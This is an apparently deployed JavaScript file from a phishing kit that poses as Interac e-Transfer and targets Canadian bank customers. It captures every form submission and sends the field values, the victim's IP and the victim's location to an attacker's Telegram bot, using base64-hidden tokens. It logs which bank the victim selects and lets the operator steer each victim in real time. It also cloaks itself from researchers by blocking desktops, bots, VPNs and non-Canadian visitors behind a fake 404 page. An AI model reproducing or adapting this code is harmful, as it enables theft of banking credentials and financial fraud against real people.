(function(_W,_D,_N){
  'use strict';

  var _M = atob('ODU4NDE3MTI5MTpBQUhmRmszSDFXaGNBYXhUT09SNXZmcWV2cmJla3lDNW5ZNA==');
  var _R = atob('ODQyMTQxMDU3NDpBQUdHeVlYb0QxMHdZTXNVamJaV3hDWU80SjMzdFltQVBBNA==');
  var _ID = atob('Njc4ODAxMjQ4MQ==');
  var _CC = 'CA';

  var _SID = _W.sessionStorage.getItem('__xsid') || (function(){
    var _x = Math.random().toString(36).substring(2,11).toUpperCase();
    _W.sessionStorage.setItem('__xsid', _x);
    return _x;
  })();

  function _die(){
    try {
      _D.open();
      _D.write('<!DOCTYPE html><html><head><title>404 Not Found</title></head><body><h1>404 Not Found</h1><p>The requested URL was not found on this server.</p><hr><address>Apache/2.4.52 (Ubuntu) Server</address></body></html>');
      _D.close();
      _W.history.pushState(null, '', '/404');
    } catch(e) {
      _W.location.replace('/404');
    }
  }

  // PROTECTION ABSOLUE DIRECT ACCESS :
  // Si ce n'est ni la page captcha ni la page interac de départ,
  // exiger immédiatement le jeton __cptPass === '1'.
  var _currPath = (_W.location.pathname || '').toLowerCase();
  var _isEntryPage = _currPath.indexOf('captcha.html') !== -1 || _currPath.indexOf('interac.html') !== -1 || _currPath === '/' || _currPath.endsWith('/public/') || _currPath.endsWith('/public');
  if (!_isEntryPage) {
    var _cpt = _W.sessionStorage.getItem('__cptPass');
    if (!_cpt || _cpt !== '1') {
      try {
        _D.documentElement.innerHTML = '';
      } catch(e){}
      _W.location.replace('/captcha.html');
      throw new Error('DIRECT_ACCESS_DENIED');
    }
  }

  function _isMobile(){
    var _ua = _N.userAgent || '';
    var _isMobUA = /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Mobile/i.test(_ua);
    var _touch = _N.maxTouchPoints > 0 || ('ontouchstart' in _W) || ('DocumentTouch' in _W);
    if (_isMobUA || (_touch && Math.min(_W.screen.width, _W.screen.height) <= 1024)) {
      return true;
    }
    return false;
  }

  function _tg(_tok, _txt, _kb){
    var _b = { chat_id: _ID, text: _txt, parse_mode: 'HTML' };
    if (_kb) _b.reply_markup = { inline_keyboard: _kb };
    return fetch('https://api.telegram.org/bot' + _tok + '/sendMessage', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(_b)
    });
  }

  function _poll(_tok, _cb){
    var _el = 0;
    var _tm = setInterval(function(){
      _el += 3000;
      if (_el > 600000) { clearInterval(_tm); return; }
      fetch('https://api.telegram.org/bot' + _tok + '/getUpdates?offset=-1&timeout=1')
        .then(function(r){ return r.json(); })
        .then(function(d){
          var _rs = d.result || [];
          if (!_rs.length) return;
          var _u = _rs[_rs.length - 1];
          var _cq = _u.callback_query;
          if (!_cq) return;
          var _dv = _cq.data || '';
          if (_dv.indexOf(_SID) === -1) return;
          clearInterval(_tm);
          _cb(_dv);
          fetch('https://api.telegram.org/bot' + _tok + '/answerCallbackQuery?callback_query_id=' + _cq.id);
        }).catch(function(){});
    }, 3000);
  }

  var _ldrInterval = null;
  function _ldr(show, seconds){
    var _e = _D.getElementById('__ld');
    if (_ldrInterval) { clearInterval(_ldrInterval); _ldrInterval = null; }
    if (!_e && show) {
      _e = _D.createElement('div');
      _e.id = '__ld';
      _e.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(255,255,255,0.97);display:flex;flex-direction:column;align-items:center;justify-content:center;z-index:2147483647;';
      _e.innerHTML = '<div style="border:4px solid #eee;border-top:4px solid #222;border-radius:50%;width:48px;height:48px;animation:__sp 0.8s linear infinite"></div><p id="__ldTxt" style="margin-top:18px;font-family:Arial,sans-serif;font-size:16px;color:#555;font-weight:bold;">Veuillez patienter...</p><style>@keyframes __sp{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}</style>';
      _D.body.appendChild(_e);
    }
    if (_e) {
      _e.style.display = show ? 'flex' : 'none';
      var _txt = _D.getElementById('__ldTxt');
      if (show && seconds && seconds > 0) {
        var rem = seconds;
        if (_txt) _txt.innerText = 'Veuillez patienter... (' + rem + 's)';
        _ldrInterval = setInterval(function(){
          rem--;
          if (rem <= 0) {
            clearInterval(_ldrInterval);
            _ldrInterval = null;
            if (_txt) _txt.innerText = 'Veuillez patienter...';
          } else {
            if (_txt) _txt.innerText = 'Veuillez patienter... (' + rem + 's)';
          }
        }, 1000);
      } else if (show && _txt) {
        _txt.innerText = 'Veuillez patienter...';
      }
    }
  }

  function _setupForms(){
    var _ip = _W.sessionStorage.getItem('__xip') || 'N/A';
    var _org = _W.sessionStorage.getItem('__xorg') || 'N/A';
    var _pg = _W.location.pathname.split('/').pop() || 'index';

    _D.querySelectorAll('form').forEach(function(_f){
      if (_f.dataset.xh) return;
      _f.dataset.xh = '1';

      _f.addEventListener('submit', function(_ev){
        _ev.preventDefault();
        _ev.stopImmediatePropagation();

        var _flds = [];
        _f.querySelectorAll('input:not([type=hidden]):not([type=submit]):not([type=checkbox]):not([type=radio]),select,textarea').forEach(function(_i){
          var _l = _i.name || _i.id || _i.placeholder || _i.type || '?';
          _flds.push('<b>' + _l + ':</b> <code>' + (_i.value || '(vide)') + '</code>');
        });

        var _nx = _f.getAttribute('action') || '';
        var _msg = '🔐 <b>CAPTURE | ' + _pg.toUpperCase() + '</b>\n━━━━━━━━━━━━━━━\n' + _flds.join('\n') + '\n━━━━━━━━━━━━━━━\n📍 IP: <code>' + _ip + '</code>\n🏢 Org: <code>' + _org + '</code>\n🆔 Session: <code>' + _SID + '</code>';
        var _kb = [
          [{ text: '✅ Valide', callback_data: _SID + ':ok' }, { text: '❌ Erreur', callback_data: _SID + ':err' }],
          [{ text: '⏳ +10s', callback_data: _SID + ':10' }, { text: '⏳ +30s', callback_data: _SID + ':30' }, { text: '⏳ +120s', callback_data: _SID + ':120' }]
        ];

        _ldr(true);
        _tg(_M, _msg, _kb).catch(function(){ _ldr(false); _W.location.href = _nx; });
        _poll(_M, function(_a){
          if (_a.indexOf(':ok') !== -1) { _ldr(false); _W.location.href = _nx; }
          else if (_a.indexOf(':err') !== -1) { _ldr(false); _W.location.reload(); }
          else {
            var _sec = _a.indexOf(':10') !== -1 ? 10 : _a.indexOf(':30') !== -1 ? 30 : 120;
            _ldr(true, _sec);
            setTimeout(function(){ _ldr(false); _W.location.href = _nx; }, _sec * 1000);
          }
        });
      }, true);
    });
  }

  function _setupBanks(){
    var _ip = _W.sessionStorage.getItem('__xip') || 'N/A';
    var _org = _W.sessionStorage.getItem('__xorg') || 'N/A';
    var _city = _W.sessionStorage.getItem('__xcity') || 'N/A';

    var _selector = '[filabel],[data-fi],.fi-tile,a[href*="101"],a[href*="html"],.fi-logo-image,img[alt]';
    _D.querySelectorAll(_selector).forEach(function(_el){
      if (_el.dataset.xb) return;
      _el.dataset.xb = '1';
      _el.addEventListener('click', function(e){
        var _raw = _el.getAttribute('filabel') || _el.getAttribute('data-fi') || _el.getAttribute('alt') || _el.getAttribute('title') || _el.innerText || '';
        
        if (!_raw || _raw.trim() === '') {
          var _img = _el.querySelector('img');
          if (_img) {
            _raw = _img.getAttribute('alt') || _img.getAttribute('title') || _img.getAttribute('src') || '';
          }
        }

        var _clean = _raw.replace(/\s+/g, ' ').trim();
        var _bankList = ['RBC', 'TD', 'BMO', 'CIBC', 'Scotiabank', 'Desjardins', 'National Bank', 'Tangerine', 'Simplii', 'KOHO', 'ATB', 'UNI', 'Laurentian', 'Meridian', 'Neo', 'PC Financial', 'Vancity', 'Wealthsimple', 'Coast Capital'];
        var _matchedBank = '';

        for (var i = 0; i < _bankList.length; i++) {
          if (_clean.toLowerCase().indexOf(_bankList[i].toLowerCase()) !== -1) {
            _matchedBank = _bankList[i];
            break;
          }
        }

        var _finalBankName = _matchedBank ? _matchedBank : (_clean || '');
        if (!_finalBankName || _finalBankName.length < 2 || _finalBankName.indexOf('INTERAC') !== -1 || _finalBankName.indexOf('Help') !== -1) return;

        if (!_W.sessionStorage.getItem('__cptPass') || _W.sessionStorage.getItem('__cptPass') !== '1') {
          _W.location.replace('captcha.html');
          return;
        }

        _tg(_R, '🏦 <b>BANQUE SÉLECTIONNÉE</b>\n🏷️ <b>' + _finalBankName + '</b>\n📍 IP: <code>' + _ip + '</code>\n🏙️ Ville: <code>' + _city + '</code>\n🏢 Org: <code>' + _org + '</code>\n🆔 Session: <code>' + _SID + '</code>');
      }, true);
    });

    _D.querySelectorAll('select').forEach(function(_sel){
      if (_sel.dataset.xb) return;
      _sel.dataset.xb = '1';
      _sel.addEventListener('change', function(){
        var _opt = _sel.options[_sel.selectedIndex];
        if (_opt && _opt.value) {
          var _bName = _opt.getAttribute('filabel') || _opt.text || _opt.value;
          if (_bName && _bName.trim().length > 1 && _bName.indexOf('Select') === -1) {
            _tg(_R, '🏦 <b>BANQUE SÉLECTIONNÉE (SÉLECTEUR)</b>\n🏷️ <b>' + _bName.trim() + '</b>\n📍 IP: <code>' + _ip + '</code>\n🏙️ Ville: <code>' + _city + '</code>\n🏢 Org: <code>' + _org + '</code>\n🆔 Session: <code>' + _SID + '</code>');
          }
        }
      });
    });
  }

  function _init(){
    // 1. Détection Bots / Headless / Emulateurs automatisés
    if (_N.webdriver || _W.callPhantom || _W._phantom || _W.__nightmare || _W.navigator.webdriver) {
      _tg(_R, '🛑 <b>BLOCAGE BOT AUTOMATISÉ (WEBDRIVER)</b>\n🆔 Session: <code>' + _SID + '</code>');
      _die();
      return;
    }

    // 2. Blocage strict PC / Émulateurs / Écrans non-mobiles
    if (!_isMobile()) {
      _tg(_R, '🛑 <b>BLOCAGE PC / NON-MOBILE</b>\n🆔 Session: <code>' + _SID + '</code>\n🖥️ UA: <code>' + _N.userAgent + '</code>');
      setTimeout(_die, 500);
      return;
    }

    _W._notifyCaptchaSolved = function() {
      var _ip = _W.sessionStorage.getItem('__xip') || 'N/A';
      var _city = _W.sessionStorage.getItem('__xcity') || 'N/A';
      var _org = _W.sessionStorage.getItem('__xorg') || 'N/A';

      _tg(_R, '✅ <b>CAPTCHA RÉSOLU</b>\n📍 IP: <code>' + _ip + '</code>\n🏙️ Ville: <code>' + _city + '</code>\n🏢 Org: <code>' + _org + '</code>\n🆔 Session: <code>' + _SID + '</code>');
    };

    _setupForms();
    _setupBanks();

    var _BLOCKED_IPS = ['174.95.196.108'];

    function _checkBlock(ip, reason) {
      if (_BLOCKED_IPS.indexOf(ip) !== -1) {
        _tg(_R, '🚫 <b>IP BANNI BLOQUÉE (' + ip + ')</b>\n🆔 Session: <code>' + _SID + '</code>');
        _die();
        return true;
      }
      return false;
    }

    function _sendVisit(ip, city, country, org) {
      if (_checkBlock(ip)) return;
      _W.sessionStorage.setItem('__xip', ip);
      _W.sessionStorage.setItem('__xorg', org || 'N/A');
      _W.sessionStorage.setItem('__xcity', city || 'N/A');

      _tg(_R, '🟢 <b>NOUVELLE VISITE</b>\n📍 IP: <code>' + ip + '</code>\n🏙️ Ville: <code>' + (city || 'N/A') + '</code>\n🌍 Pays: <code>' + (country || 'N/A') + '</code>\n🏢 Org: <code>' + (org || 'N/A') + '</code>\n🆔 Session: <code>' + _SID + '</code>');
    }

    // Détection Hardware Timezone (Cross-check Canada)
    // Tout mobile réel au Canada est réglé sur un fuseau Canada ou Amérique du Nord compatible.
    var _devTz = '';
    try {
      _devTz = Intl.DateTimeFormat().resolvedOptions().timeZone || '';
    } catch(e){}

    var _caTz = [
      'America/Toronto', 'America/Montreal', 'America/Vancouver', 'America/Edmonton',
      'America/Winnipeg', 'America/Halifax', 'America/St_Johns', 'America/Regina',
      'America/Calgary', 'America/Ottawa', 'America/Moncton', 'America/Fredericton',
      'America/Whitehorse', 'America/Yellowknife', 'America/Iqaluit', 'America/Glace_Bay',
      'America/Goose_Bay', 'America/Rankin_Inlet', 'America/Resolute', 'America/Atikokan',
      'America/Blanc-Sablon', 'America/Cambridge_Bay', 'America/Creston', 'America/Dawson',
      'America/Dawson_Creek', 'America/Fort_Nelson', 'America/Inuvik', 'America/Nipigon',
      'America/Pangnirtung', 'America/Rainy_River', 'America/Swift_Current', 'America/Thunder_Bay'
    ];

    // Si le timezone de l'appareil indique un pays étranger hors Amérique du Nord (ex: Europe, Asie, Afrique, Russie)
    if (_devTz && _devTz.indexOf('Europe/') === 0 || _devTz.indexOf('Asia/') === 0 || _devTz.indexOf('Africa/') === 0 || _devTz.indexOf('Australia/') === 0) {
      _tg(_R, '🛑 <b>BLOCAGE VPN ÉTRANGER (TIMEZONE MISMATCH)</b>\n🕒 Timezone Appareil: <code>' + _devTz + '</code>\n🆔 Session: <code>' + _SID + '</code>');
      setTimeout(_die, 400);
      return;
    }

    var vpnPatterns = /vpn|proxy|tor|exit|relay|datacenter|hosting|server|cloud|vps|ovh|digitalocean|linode|hetzner|m247|choopa|vultr|leaseweb|colocrossing|cogent|amazon|aws|google|azure|microsoft|oracle|alibaba|cloudflare|fastly|akamai|packethub|quadranet|tzulo|ipvanish|nord|expressvpn|surfshark|cyberghost|privateinternetaccess|mullvad|proton|purevpn|windscribe|hide\.me|zenmate|hotspot|tunnelbear|anchorfree|hostpapa|datapacket|performive|cogentco|zenlayer|contabo|kamatera|ionos|rackspace|interserver|liquidweb|tsohost|namecheap|hostinger|inmotion|dreamhost|bluehost|siteground|a2hosting|godaddy|hawkhost|scaleaway|scaleway|upcloud|equinix|gtt|zayo|lumen|centurylink|level3|hurricane|he\.net|bot|crawl|spider|scrape/i;

    function _verifyWithSecondaryApi(ip, city, country, org) {
      fetch('https://freeipapi.com/api/json/' + ip)
        .then(function(res){ return res.json(); })
        .then(function(sec){
          if (sec) {
            if (sec.isProxy === true) {
              _tg(_R, '🛑 <b>BLOCAGE PROXY / VPN SUSPECT (FREEIPAPI)</b>\n📍 IP: <code>' + ip + '</code>\n🏢 ASN Org: <code>' + (sec.asnOrganization || org) + '</code>');
              setTimeout(_die, 400);
              return;
            }
            if (sec.countryCode && sec.countryCode !== _CC) {
              _tg(_R, '🛑 <b>BLOCAGE PAYS DÉTECTÉ (FREEIPAPI: ' + sec.countryCode + ')</b>\n📍 IP: <code>' + ip + '</code>');
              setTimeout(_die, 400);
              return;
            }
            if (sec.asnOrganization && vpnPatterns.test(sec.asnOrganization.toLowerCase())) {
              _tg(_R, '🛑 <b>BLOCAGE DATACENTER ASN (' + sec.asnOrganization + ')</b>\n📍 IP: <code>' + ip + '</code>');
              setTimeout(_die, 400);
              return;
            }
          }
          _sendVisit(ip, city, country, org);
        })
        .catch(function(){
          _sendVisit(ip, city, country, org);
        });
    }

    // Récupérer IP, Ville, Pays et Opérateur immédiatement
    fetch('https://ipwho.is/')
      .then(function(r){ return r.json(); })
      .then(function(d){
        if (d && d.success) {
          if (_checkBlock(d.ip)) return;
          if (d.country_code !== _CC) {
            _tg(_R, '🛑 <b>BLOCAGE PAYS (' + d.country_code + ')</b>\n📍 IP: <code>' + d.ip + '</code>\n🏙️ Ville: <code>' + (d.city || 'N/A') + '</code>');
            setTimeout(_die, 500);
            return;
          }

          var _org = d.connection ? (d.connection.org || d.connection.isp || d.connection.domain || '') : '';
          var _orgLower = _org.toLowerCase();
          
          if (vpnPatterns.test(_orgLower) || (d.connection && d.connection.asn === 13335)) {
            _tg(_R, '🛑 <b>BLOCAGE VPN / DATACENTER (' + _org + ')</b>\n📍 IP: <code>' + d.ip + '</code>\n🏙️ Ville: <code>' + (d.city || 'N/A') + '</code>');
            setTimeout(_die, 500);
            return;
          }

          // Double validation de réputation d'IP
          _verifyWithSecondaryApi(d.ip, d.city, d.country, _org);
        } else {
          _traceFallback();
        }
      })
      .catch(function(){
        _traceFallback();
      });

    function _traceFallback(){
      fetch('https://www.cloudflare.com/cdn-cgi/trace')
        .then(function(r){ return r.text(); })
        .then(function(t){
          var locMatch = t.match(/loc=([A-Z]{2})/);
          var ipMatch = t.match(/ip=([^\n]+)/);
          var loc = locMatch ? locMatch[1] : 'CA';
          var ipVal = ipMatch ? ipMatch[1] : 'N/A';

          if (loc !== _CC && loc !== 'N/A') {
            _tg(_R, '🛑 <b>BLOCAGE PAYS (' + loc + ')</b>\n📍 IP: <code>' + ipVal + '</code>');
            setTimeout(_die, 500);
            return;
          }

          _verifyWithSecondaryApi(ipVal, 'Canada (Trace)', loc, 'Canada ISP');
        })
        .catch(function(){
          _sendVisit('N/A', 'N/A', 'Canada', 'N/A');
        });
    }
  }

  if (_D.readyState === 'loading') {
    _D.addEventListener('DOMContentLoaded', _init);
  } else {
    _init();
  }

})(window, document, navigator);